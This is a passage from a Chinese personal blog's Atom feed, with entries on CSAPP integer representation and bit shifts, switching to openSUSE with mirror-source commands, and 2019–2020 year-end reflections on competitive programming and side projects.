&lt;h2 id=&quot;part-1.-概括&quot;&gt;Part 1. 概括。&lt;/h2&gt;
&lt;p&gt;这一年实在是多灾多难的一年。
年初的时候其实还蛮好的（&lt;del&gt;还记得大年初一学对顶堆&lt;/del&gt;）
然而接下来经历了中考考前的四个月+考后假期一个月+高一网课一个月+高一线下课四个月
彻底毁了我整个精神状态（或者说引爆了埋在深处的雷罢）&lt;/p&gt;
&lt;p&gt;中考考前四个月，我做了大概是目前最后悔的一个决定，我退役了OI。
说是为了学习，其实也只是跟风 包括满足自己虚荣心之类的。
那个时候精神状态就在恶化（尽管现在看来当时算很不错的），
于是还是在颓了四个月之后，甚至还碰运气考上全县前50（大概是35的样子）进了我最恐惧的实验班。&lt;/p&gt;</summary>
    
    
    
    <category term="年终总结" scheme="https://amiriox.github.io/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 2021-02-08</title>
    <link href="https://amiriox.github.io/2021/02/08/CSAPP-2021-02-08/"/>
    <id>https://amiriox.github.io/2021/02/08/CSAPP-2021-02-08/</id>
    <published>2021-02-07T16:00:00.000Z</published>
    <updated>2025-02-13T16:10:06.707Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><h1 id="csapp-today">CSAPP Today:</h1><h3 id="csapp-2.2.4专题有符号数和无符号数之间的转换">——CSAPP2.2.4专题：有符号数和无符号数之间的转换</h3><p>这篇博客会更新一段时间。</p><hr /><h3 id="一-有符号数转换到无符号数">一 有符号数转换到无符号数</h3><p>考虑如下代码（摘自CSAPP）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> <span class="type">int</span> v = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> uv = (<span class="type">unsigned</span> <span class="type">short</span>) v;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;v = %d, uv=%u\n&quot;</span>, v, uv);</span><br></pre></td></tr></table></figure><p>在采用补码的基础上 这段代码输出 <code>v = -12345, uv = 53191</code>观察发现-12345的补码表示和53191的无符号表示是完全一样的。也就是说，在C语言中 有符号到无符号转换时，底层的位模式是一样的。</p><p>用数学化的语言描述这个规则就是：</p><p><span class="math display">\[T2U_w(x)=B2U_w(T2B_w(x)), (TMin_w\leq x\leq TMax_w)\]</span></p><p>举个例子。<spanclass="math inline">\(T2U_4(-8)=B2U_4(T2B_4(-8))=B2U_4(11111000)=\text{(截取四位)}\quadB2U_4(1000)=8\)</span></p><p>还有一个简单的规律：负的有符号整数的绝对值与转换后的无符号整数之和为<span class="math inline">\(2^w\)</span>, <spanclass="math inline">\(w\)</span> 为（位模式的）位数，即 <spanclass="math inline">\(|x|+T2U_w(x)=2^w， x&lt;0\)</span>例如，上面例子中 <spanclass="math inline">\(|-12345|+53191=65536=2^{16}\)</span>。这样我们可以很快速算出负的有符号数换到无符号数：<spanclass="math inline">\(2^w-|x|\)</span></p><p>所以我们可以得到： <span class="math display">\[\begin{equation}T2U_w(x)=\left\{             \begin{array}{lr}             x+2^w, &amp; x&lt;0 \\             x, &amp; x\geq0             \end{array}\right.\end{equation}\]</span> ## 未完待续（这里研究了好久才勉强看懂）</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;csapp-today&quot;&gt;CSAPP Today:&lt;/h1&gt;
&lt;h3 id=&quot;csapp-2.2.4专题有符号数和无符号数之间的转换&quot;&gt;——CSAPP
2.2.4专题：有符号数和无符号数之间的转换&lt;/h3&gt;
&lt;p&gt;这篇博客会更新一段时间。&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>换了个 OpenSUSE 玩玩</title>
    <link href="https://amiriox.github.io/2021/01/31/move_to_opensuse/"/>
    <id>https://amiriox.github.io/2021/01/31/move_to_opensuse/</id>
    <published>2021-01-30T16:00:00.000Z</published>
    <updated>2025-02-13T16:14:58.215Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><blockquote><p>upd 2024-10-02 22:56:57<br />第一次用感觉还行，后来高三又从win换回opensuse,感觉挺垃圾的<br />今天太晚了等明天把我那篇批判的文章迁移过来</p></blockquote><h1 id="更换到了opensuse">更换到了openSUSE</h1><hr /><p>一直在考虑是否要换个linux玩玩。自从10月1日（其实是10月2日凌晨）装好了manjaro 我就没停过折腾这玩意。</p><blockquote><p>upd 2024-10-02 22:55:45<br />现在我在 archlinux + hyprland + neovim 迁移博客。<br />ubuntu manjaro opensuse arch… 我的未来。</p></blockquote><p>现在从manjaro换到了openSUSE</p><p><a href="https://imgchr.com/i/yEQM5t"><imgsrc="https://s3.ax1x.com/2021/01/31/yEQM5t.png"alt="yEQM5t.png" /></a></p><h2 id="关于换源">关于换源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/opensuse/tumbleweed/repo/oss/ ali-oss  <span class="comment"># 添加开源仓库的镜像源</span></span><br><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/opensuse/tumbleweed/repo/non-oss/ ali-noss  <span class="comment"># 添加闭源仓库的镜像源</span></span><br><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/packman/openSUSE_Tumbleweed/ ali-packman  <span class="comment"># PackMan仓库</span></span><br></pre></td></tr></table></figure><p>可以选择别的源 替换链接即可</p><p>阿里云源</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.aliyun.com/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.aliyun.com/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.aliyun.com/packman/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure><p>清华源</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/packman/suse/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure><p>中科大源</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.ustc.edu.cn/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.ustc.edu.cn/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.ustc.edu.cn/packman/suse/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure><p>美化就不说了，KDE美化教程一搜一大片</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;upd 2024-10-02 22:56:57&lt;br&gt;
第一次用感觉还行，后来高三又从win换回opensuse,感觉挺垃圾的&lt;br&gt;
今天太晚了等明天把我那篇批判的文章迁移过来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;更换到了opensuse&quot;&gt;更换到了openSUSE&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;一直在考虑是否要换个linux玩玩。
自从10月1日（其实是10月2日凌晨）装好了manjaro 我就没停过折腾这玩意。&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://amiriox.github.io/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="Linux" scheme="https://amiriox.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 2021-01-18</title>
    <link href="https://amiriox.github.io/2021/01/18/CSAPP-2021-01-28/"/>
    <id>https://amiriox.github.io/2021/01/18/CSAPP-2021-01-28/</id>
    <published>2021-01-17T16:00:00.000Z</published>
    <updated>2025-02-13T16:10:02.185Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><h1 id="csapp-today-2021-01-18">CSAPP Today 2021-01-18</h1><h2 id="一-左移和右移">一 左移和右移</h2><p>对于<code>x&lt;&lt;k</code>称为将 <spanclass="math inline">\(x\)</span> 左移 <spanclass="math inline">\(k\)</span> 位。 对于一个位向量表示为 <spanclass="math inline">\([x_{w-1}, x_{w-2}, ..., x_0]\)</span> 的操作数<span class="math inline">\(x\)</span>, <code>x&lt;&lt;k</code>的结果是$[x_{w-k-1}, x_{w-k-2}, …, x_0, 0, …, 0] $ 也就是向左移动 <spanclass="math inline">\(k\)</span> 位, 右侧空缺用0补齐。在C中，左移运算符从左至右结合。即<code>x&lt;&lt;i&lt;&lt;j</code>相当于<code>(x&lt;&lt;j)&lt;&lt;k</code></p><p>对于<code>x&gt;&gt;k</code>成为将 <spanclass="math inline">\(x\)</span> 右移 <spanclass="math inline">\(k\)</span> 位。不同的是，<strong>右移有两种形势，算术右移和逻辑右移</strong>。</p><h3 id="逻辑右移">1.1 逻辑右移</h3><p>逻辑右移与左移相对，即对于一个位向量表示为 <spanclass="math inline">\([x_{w-1}, x_{w-2}, ..., x_0]\)</span> 的操作数<span class="math inline">\(x\)</span>, <code>x&lt;&lt;k</code>的结果是<span class="math inline">\([0, ..., 0, x_{w-1}, x_{w-2}, ...,x_{k}]\)</span> 也就是说，向右移动 <spanclass="math inline">\(k\)</span> 位，抛弃最右侧的k位，在左端补0</p><h3 id="算术右移">1.2 算术右移</h3><p>与逻辑右移不同的是，同样是抛弃最右侧k位，但<strong>在左端补原数的最高有效位</strong>，即对于一个位向量表示为 <span class="math inline">\([x_{w-1}, x_{w-2},..., x_0]\)</span> 的操作数 <span class="math inline">\(x\)</span>,<code>x&lt;&lt;k</code>（算术右移）的结果是 <spanclass="math inline">\([x_{w-1}, x_{w-1}, ..., x_{w-1}, x_{w-2}, ...,x_{k}]\)</span></p><p>大多数C编译器使用算术右移。但对于无符号数除外，因为无符号数只能逻辑右移。Java标准明确规定执行逻辑右移。</p><blockquote><p>Tips:</p><p>UB (Undefined Behavior) 是指C或C++标准并未定义的语法，这通常意味着编译器可以在遇到ub时做任何事，比如打开一个游戏<del>我在某个群听到说古老版本的g++碰到ub就是打开一个游戏</del></p><p>那么为什么要有ub呢？是因为制定标准的人没想到吗？为什么java没有ub呢？</p><p>大家知道C和C++是偏向底层的语言，追求速度（即便C++有OOP模板元等特性，但也追求零开销抽象）而对于不同情况，留下一些“漏洞”让编译器自行决定在某些特定场合<del>比如造火箭</del> 可以追求到极致速度而Java则没有这样的问题，毕竟JVM上的东西就算没有GC也不可能满足某些场景下的苛刻条件的，那些场景比卡常还难</p></blockquote><p>左右移运算符优先级低。使用时请注意括号。</p><h2 id="二-类型转换">二 类型转换</h2><p>定义补码为表示 <span class="math inline">\(T\)</span>, 无符号数表示为<span class="math inline">\(U\)</span>, 二进制数为 <spanclass="math inline">\(B\)</span>, 而<code>2</code>则代表<code>to</code>定义函数 <span class="math inline">\(U2B_w\)</span>为无符号数到二进制数转换函数，两者都是 <spanclass="math inline">\(w\)</span> 位表示的， 其他 <spanclass="math inline">\(U2T_w\)</span> <spanclass="math inline">\(T2B_w\)</span> 以此类推</p><blockquote><p>关于这个的理解：虽然说叫<code>转换</code>，但实际上可以理解为<code>把...当成...看 计算出的结果</code>比如<code>B2T</code>就是<code>把二进制看成补码，得出的结果的十进制表示</code>这里的B代表的二进制是最基础的01位向量</p></blockquote><h3 id="无符号数-b2u">2.1 无符号数 （B2U）</h3><p>对于向量 $ x=[x_{w-1}, x_{w-2}, …, x_0]$ ：</p><p><spanclass="math display">\[B2U_w(x)=\sum_{i=0}^{w-1}x_i2^i\]</span></p><p>这个和 OI一些比赛初赛的二进制相关是一样的，可以手动模拟一下，没学过求和符号的可以看这个</p><p><span class="math display">\[U2B_4([1011])=1 \times 2^3+0 \times2^2 +1 \times 2^1 + 1 \times 2^0=11\]</span></p><p>考虑 <span class="math inline">\(w\)</span>位二进制表示的最大值和最小值。最小值当然就是0（负数的表示以后会说）最大值即为<span class="math inline">\(\sum_{i=0}^{w-1}2^i\)</span>，即向量每一位都是1。 根据等比数列公式易得<spanclass="math inline">\(\sum_{i=0}^{w-1}2^i=2^w-1\)</span></p><p>函数 <span class="math inline">\(B2U_w\)</span>是一个双射，即任意一个 <span class="math inline">\([0,2^w-1]\)</span>的无符号数都有唯一的二进制表示， 同时每个 <spanclass="math inline">\(w\)</span> 二进制表示都对应唯一一个 <spanclass="math inline">\([0,2^w-1]\)</span> 的无符号数</p><h3 id="补码表示-b2t">2.2 补码表示 （B2T）</h3><p>根据补码的定义，易得以下公式（其实手动带个数进去就好了）</p><p><spanclass="math display">\[B2T_w(x)=-x_{w-1}2^{w-1}+\sum_{i=0}^{w-2}x_{i}2^{i}\]</span></p><p>最高为 <span class="math inline">\(x_{w-1}\)</span>称为符号位。如果是 <span class="math inline">\(0\)</span> 则 <spanclass="math inline">\(-0=0\)</span> 所以不计（正数），如果是 <spanclass="math inline">\(1\)</span> 则 <spanclass="math inline">\(-1=1\)</span> 乘上 <spanclass="math inline">\(2^{w-1}\)</span> 即表示负数如果不知道这种方式为什么能表达补码 那么请看下面</p><p>首先我们知道补码的定义是反码加一，反码也就是最高位符号位剩下的位都取反。 所以</p><p><span class="math display">\[[1011]_{2\text{补码}} =[1010]_{2\text{反码}} = -[101]_{2} = -(1\times 2^{2}+0+1\times2^0=-(4+1)=-5)\]</span></p><p>而根据上面公式</p><p><span class="math display">\[B2T_4([1011])=-1\times2^{3}+\sum_{i=0}^{2}x_{i}2^{i}=-8+1\times 2^0+1\times2^{1}+0=-8+1+2=-5\]</span></p><p>看明白逻辑了吗？<span class="math inline">\(B2T\)</span>的公式实际上就是以负的为基准然后加上正的（相当于取反再取反）而常规（按照定义算）是直接取反后加好正的然后取相反数<del>有些大佬也可以证明一下这两个公式等价</del></p><p>和上面一样的推理，<spanclass="math inline">\(TMax_w=2^{w-1}-1\)</span>， 而 <spanclass="math inline">\(TMin_w=-2^{w-1}\)</span> 有没有感觉熟悉？ <spanclass="math inline">\([-2147483648, 2147483647]\)</span> （即 <spanclass="math inline">\(-2^{31}\)</span> 和 <spanclass="math inline">\(2^{31}-1\)</span></p><p>同样，<span class="math inline">\(B2T\)</span> 也是一个双射。</p><blockquote><p>C标准并没有说有符号整数一定要用补码表示，即使大多数实现都是这样做。Java要求采用补码表示。同时单字节数据是<code>byte</code>而不是<code>char</code>。</p></blockquote><h3 id="其他表示">2.3 其他表示</h3><p>我们知道除了补码 还有原码和反码。</p><p>反码与补码唯一的差别就是一个 <spanclass="math inline">\(1\)</span>。所以只要把 <spanclass="math inline">\(B2T\)</span> 公式的最高符号位改为 <spanclass="math inline">\(-x_{w-1}(2^{w-1}-1)\)</span> 用 <spanclass="math inline">\(O\)</span> 表示反码 (<strong>O</strong>nes’Complement)，则</p><p><spanclass="math display">\[B2O_w(x)=-x_{w-1}(2^{w-1}-1)+\sum_{i=0}^{w-2}x_{i}2^{i}\]</span></p><p>原码的公式也可以很简单地推导出来，这里不再赘述。</p><p>这两种表示方法的缺点是 <span class="math inline">\(0\)</span>可以有两种表示。而且不具备补码在计算上的优势。</p><hr /><h3 id="待更还有补码相关内容">待更，还有补码相关内容</h3><p>写在后面的话：</p><p>从发暂退役帖以来已经很久了 感谢大家的关心说真的没想到有那么多人评论</p><p>我发现我不知道我学习OI的目标是什么，即使我在写题学算法的过程中感受到了快乐</p><p>但每次做不出题都会有极大挫败感然后心里那种别扭的劲就总想让逼我更加油一点</p><p>而这样慢慢就变成「自己给自己下任务」了，那份纯粹的快乐也没有了</p><p>然后越来越焦虑，总觉得自己努力还不够 结果陷入恶性循环</p><hr /><p>Manjaro KDE是真的离谱，设置上外观全没，动不动显卡驱动挂了</p><p>有时候调整音量那个显示在屏幕中间的音量大小图标（仿macOS的主题）就会直接截取那个位置上显示的东西 然后还自己消失不掉而且这个状态下放任何东西都没声，b站还是别的视频都打不开</p><p>点任务栏浏览器也没反应，我</p><p><a href="https://imgchr.com/i/y9oUaR"><imgsrc="https://s3.ax1x.com/2021/01/28/y9oUaR.png"alt="y9oUaR.png" /></a></p><p>嗯， 然后过了好久才反映，这反射弧是NM离谱</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; 可能有误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;csapp-today-2021-01-18&quot;&gt;CSAPP Today 2021-01-18&lt;/h1&gt;
&lt;h2 id=&quot;一-左移和右移&quot;&gt;一 左移和右移&lt;/h2&gt;
&lt;p&gt;对于&lt;code&gt;x&amp;lt;&amp;lt;k&lt;/code&gt;称为将 &lt;span class=&quot;math inline&quot;&gt;&#92;(x&#92;)&lt;/span&gt; 左移 &lt;span class=&quot;math inline&quot;&gt;&#92;(k&#92;)&lt;/span&gt; 位。 对于一个位向量表示为 &lt;span class=&quot;math inline&quot;&gt;&#92;([x_{w-1}, x_{w-2}, ..., x_0]&#92;)&lt;/span&gt; 的操作数
&lt;span class=&quot;math inline&quot;&gt;&#92;(x&#92;)&lt;/span&gt;, &lt;code&gt;x&amp;lt;&amp;lt;k&lt;/code&gt;的结果是$
[x_{w-k-1}, x_{w-k-2}, …, x_0, 0, …, 0] $ 也就是向左移动 &lt;span class=&quot;math inline&quot;&gt;&#92;(k&#92;)&lt;/span&gt; 位, 右侧空缺用0补齐。
在C中，左移运算符从左至右结合。即&lt;code&gt;x&amp;lt;&amp;lt;i&amp;lt;&amp;lt;j&lt;/code&gt;相当于&lt;code&gt;(x&amp;lt;&amp;lt;j)&amp;lt;&amp;lt;k&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;x&amp;gt;&amp;gt;k&lt;/code&gt;成为将 &lt;span class=&quot;math inline&quot;&gt;&#92;(x&#92;)&lt;/span&gt; 右移 &lt;span class=&quot;math inline&quot;&gt;&#92;(k&#92;)&lt;/span&gt; 位。
不同的是，&lt;strong&gt;右移有两种形势，算术右移和逻辑右移&lt;/strong&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>辉煌落幕 -- 2020 年终总结</title>
    <link href="https://amiriox.github.io/2020/12/25/2020_curtain_falls/"/>
    <id>https://amiriox.github.io/2020/12/25/2020_curtain_falls/</id>
    <published>2020-12-24T16:00:00.000Z</published>
    <updated>2025-02-13T16:21:46.149Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>此文章的 <em>撰写时间</em> 可能有误</p></blockquote><p><strong>2020对我来说是极其重要的一年, 堪比2018年</strong></p><h1 id="一-简述">一 简述</h1><p>这一年乱七八糟的 想起来似乎没有记忆却又全是记忆</p><p>由于疫情的原因 这一年变得很奇怪</p><p>我的很多心理问题 从2019年的导火线开始 到网课期间完全引爆</p><p>那时的恐怖 黑暗和痛苦我至今想起来还如同窒息</p><p>当然 这一年也有感动, 进步, 创造, 成就…</p><p>那些收获将和痛苦一起 伴随着我前进 成为我最宝贵的人生财富</p><p>虽有黑色却又五彩缤纷的人生 总比一张白纸要好的多吧</p><p>写这个的主要原因是现在2020快结束了(元旦就放寒假了因为<code>COVID-19</code>的关系)</p><p>加上看到了很多人的年终总结 (OIer的 V站程序员的一起其他一些朋友的)</p><h1 id="二-成就-成就">二 成就? 成就!</h1><p><del>获得的成就当然要放在前面啦</del></p><ul><li>截至2020年1月 我<del>走马观花地</del>看完了&lt;&lt;数据结构,算法与应用 C++语言描述&gt;&gt; (我的第一本黑皮书)并实现了很多数据结构和算法</li><li>2020年2月17日 我入坑OI 来到了这个刚刚在1月份的强基计划摧残过的领域这里对我来说 陌生却又不陌生…</li><li>2020年2月那些日子 我开始了上午看紫书 下午刷洛谷的日子.截至2020年2月29日, 我写了35题<ul><li>从头看紫书 看到了动态规划 现在想起来很多东西都是一知半解但当时丝毫不恐惧.</li><li>学习知识的最重要一点是: 不要恐惧未知</li></ul></li><li>2020年3月 写题最多的一个月 也是目前为止写题最多的一个月 60题<ul><li>打了洛谷的第一场比赛 测试深基题目的最后一场, 排名<code>#198</code>目前为止打比赛最高排名和最多通过吧 主要都是sort水题模拟和暴力之类的题</li></ul></li><li>2020年4月 水C++群 学习了SML Prolog OCaml等语言就是七周七语言里的那些 眼界开阔了许多知道计算机的知识体系还有很深很深…</li><li>2020年5月<ul><li>痛苦黑暗的日子来临了 由于一些较为隐私的事情 加上父母的一些事情严重影响了我的心态 本来在2019年压制住的问题又爆发出来</li><li>由于心里原因和上网课的颓废 数学考了43分(这次期末估分差不多117/120可以对比下) 再加之父母的另一些问题 直接导致我心态崩掉</li><li>由于一些情感问题, 内心绝望</li><li>在Jvav仓库提交了我在Github的第一个pull request,通过哦#define的方式重新定义关键字做了Jvav Programminglanguage的第一个版本编译器 号称兼容C++ (逃) |据说这个梗得到了当事人zhy的许可(伏笔 下面还会说到)</li><li>当然那个pr由于另一个人改进了我的代码 就打了重复标签然后拒了</li><li>买了深基</li><li>五月通过21题</li></ul></li><li>2020年6月 某些机缘巧合下 一个Jvav Development Team诞生了. 没错,2019年心心念念 做了那么多铺垫和筹备的团队没能成功组建但就是因为这样一个梗 一些人(<del>三个人</del>)聚集了起来<ul><li>这阶段学了一些基本git的使用, 对VCS有了更多了解当时在Gitee进行配合</li><li>当然因为大家都不怎么会git 所以手法还是很不熟练的</li><li>没有CI 没有code review 什么都没有 就是这样一个朴素的团队 (</li><li>深基 六月份还没有送到</li><li>六月通过8题 是目前的最低记录</li></ul></li><li>2020年7月 发现之前JCP(通过define套壳gcc)不能一直下去开始学习正经编译原理(买了&lt;<编译原理>&gt;我的第二本黑皮书),并且跟着LLVM的文档做一个toy language<ul><li>早上早期在马桶上看编译原理(龙书) (</li><li>开始学习rust, 看&lt;<The Rust Language Book>&gt;这本书大概是我看过最棒的讲语言的书了 (其实是官方的文档),看到11章<code>测试</code>结束, 后面还有闭包 只能指针之类的东西</li><li>llvm windows不支持<code>--config</code> 因此想了好多办法最后在团队里一个朋友(如果当事人允许也许会@一下)的windows上装ubuntu虚拟机然后远程= = 感觉好二(我本地磁盘不够装虚拟机的)</li><li>后来删了一堆东西 卸载了一些没用的东西 装了macOS虚拟机然后发现llvm的<code>--config</code>可以在macOS用,于是编译出了这个Jvav语言编译器JLC的第一个版本 有lexer和parser并且有转换LLVM IR和AST的代码</li><li>大概是这个时候 看了WWDC 成了一名果粉 随即发现微软没有那么香了</li><li>咕咕了很久的深基终于到了 但是由于一直在搞工程只看了前面一写我本来就会的内容</li><li>给某个人写了个Android小游戏这完全是我照着之前的Java底子(我六年级的时候入门编程学得JavaSE)和google的文档写的 写了一半就有别的事情忙去了这个github上还有仓库 已经archived了:https://github.com/AMIRIOX/leaping-octopus</li><li>老师逼迫下我参加了一个什么程序设计比赛 需求和文档写的和屎一样根本没说出来想要啥 一股华而不实的风格然后通宵半周搞出来了一个Qt写的天气预报程序:https://github.com/AMIRIOX/SpjWeather , 毫无意外地拿了一等奖.虽然当时代码风格我自己都看不下去, 设计模式啥也不会,代码质量不敢评价,但这个比赛含金量太低了…. 虽然是windows的但是qt有跨平台buff 有时间在现在linux上搞一下qt然后编译下看看 (</li><li>搞了自己的博客 typecho+阿里云的服务器(RMB 98/年)</li><li>巩固了一些基础算法(二分/贪心, dfs等) 刷了题单</li><li>一些事情:在jvav.top一方(也是我五月份交pr的那个仓库的owner)的舆论(这个人由于当时的一些事情卷了很多奇怪的事情里)加上对方对JDT的不支持 导致团队发展逐渐堪忧.另外前期对项目质量控制的忽略(no CI, no cr, no docker, no test!)项目开始变得难以维护 重构了几次都没有起色. 然后最后直接原因来了,我们当时以为获得了Jvav梗当事人zhy的许可(这个事我是让一个团队里的人联系搞得)但实际没有(他给了个截图 但实际上聊天记录截图不是本人)然后我们开始怀疑我们目标的正确性 于是最终迫于多方面压力解散了JDT.这些项目在github还有archived的仓库: <ahref="https://github.com/AMIRIOX/JvavLlvmCompiler">JLC</a>和<ahref="https://github.com/AMIRIOX/JvavCompilePlatform">JCP</a>,以及在Gitee上Jvav的VSCode插件(本想写语言服务器但发现太菜了写不了) <ahref="https://gitee.com/airk/Jvavscode">Jvavscode</a>, <ahref="https://gitee.com/Jvavdev/">这</a>是当时的gitee 组织</li><li>迎来了期末考试 毫无疑问考砸了 因为颓的时间太多</li><li>15天生地结业总复习. 算是心理状态比较好的日子, 整天听网课之类的,卷发了4套 我都是边听课边写 发现效果更好,早上班主任要求我们在钉钉会议露脸 然后我把摄像头调整在挡住我手的地方然后继续开TIM水群聊天 不亦乐乎</li><li>生物地理结业考试: 生物100 地理99 (东西半球错了这个看了好多遍就是绕不过弯子)</li><li>然后whk也结束了 放寒假了 JDT也解散了 当然龙书也没有看完那些项目也archived了, 就开始正经搞OI 就是那样子啦 然后开始看深基了进步比较大.</li><li>七月通过16题</li></ul></li><li>2020年8月 开始潜心搞OI 进入了红色世界!<ul><li>物理和数学的补课(毕竟上学的时候没学但还是要中考)导致每天时间安排都很乱 但还是有些进步.</li><li>心理状态不太好 但勉强讲究.</li><li>后来补课结束 OI水平大跃进, 进步了很多(主要是树和图还有图相关的算法)</li><li>但是越来越自卑 对自己OI水平不自信 感觉很空(现在也是 但缓解很多)</li><li>开始继续学OI之外的一些东西, 想了想 想起编译原理的难度组成原理啊之类的高深 柿子先挑软的捏 就选了多线程 于是看了多线程七篇了解了互斥锁/条件变量/读写锁之类的多线程概念, 实现的代码在这个仓库: <ahref="https://github.com/AMIRIOX/multithreading">multithreading</a></li><li>补课的时候一同学给我看了些精神污染的东西…我对这些东西承受能力很差然后看到一句话”心中有党 做事不慌” 然后听义勇军进行曲(中国国歌欸),牢不可破的联盟(苏联国歌) 还有法国国歌等</li><li>然后看到了国际歌 了解了苏联的一些历史 开始对共产主义产生兴趣</li><li>严格意义来讲当时的我只算<code>共产主义趣味者</code>没有理论武装头脑, 但还是使我产生了很大兴趣<del>为以后深入做铺垫</del></li><li>装了WSL 这也算我第一个长期用的Linux之前在VMware里短暂体验过Ubuntu</li><li>搞了些奇怪的东西, 包括<ahref="https://github.com/AMIRIOX/Golden-Touch">Golden-Touch</a>, <ahref="https://github.com/AMIRIOX/subsystem-for-windoge">windoge forlinux subsystem</a>和<ahref="https://github.com/AMIRIOX/weird-code">weird-code</a>,weird-code也是第一个和陌生人合作的项目</li><li>八月份刷了<strong>46题</strong></li></ul></li><li>2020年9月 开学了 全国复工复产 中国开始了活跃的气象, 在学校嘛还是那些事情<ul><li>在重新看紫书, 逐渐又看到了动态规划</li><li>惊喜地发现好多紫书上之前很难理解的东西变得简单了 <del>就这</del>这就是进步吧</li><li>看了一个大佬的NOI Vlog(这个上过你谷日报 应该都知道吧) 看这NOI考场思考着有一天 我是否能进去呢?</li><li>九月通过10题, 这个月没什么特别的事情</li></ul></li><li>2020年10月 比较有趣?<ul><li>发现月考考得还可以(主科第二, 全科第一, 主要是物理化学不行)</li><li>10月1日(准确说是2日), 通宵换Linux, 本来想用archlinux但是gdisk结束然后挂载的时候一直bus error, google无果 询问无果,只好用manjaro了</li><li>报名了CSP 2020 (JS都报了), 开始准备初赛, 整天刷洛谷有题总感觉心里没底qwq</li><li>当时有些原因心情不太好 再加上对CSP第一轮成绩的担心,以及即将到来的期中考试 觉得很慌</li><li>看了那兔, 极大激发了我的爱国热情 ( ( (</li><li>当月通过12题, 洛谷有题练习了八九次</li></ul></li><li>2020年11月 我的第一次CSP<ul><li>开始准备CSP第二轮 复习了一些算法 二分啊贪心啊dfs啊(是不是似曾相识(逃))</li><li>我是普及组水平 但还是报了提高组 有些慌, 后来很多人说线段树常考我就打算学线段树</li><li>发现这东西没啥难的 就直接上了 但还是有个bug没调处来</li><li>11.7 十月革命 龙江初雪 吸哎思劈 6号出发去大庆的时候 晚上从教室离开我同桌还有好多人给我加油来着 蛮温暖的QwQ 虽然父母不支持但总有人支持我的</li><li>11.7 CSP当天, 上午J组有些紧张 有些该拿的分没拿到, T1忘记注释freopen,T4浪费太多时间调弱智问题, 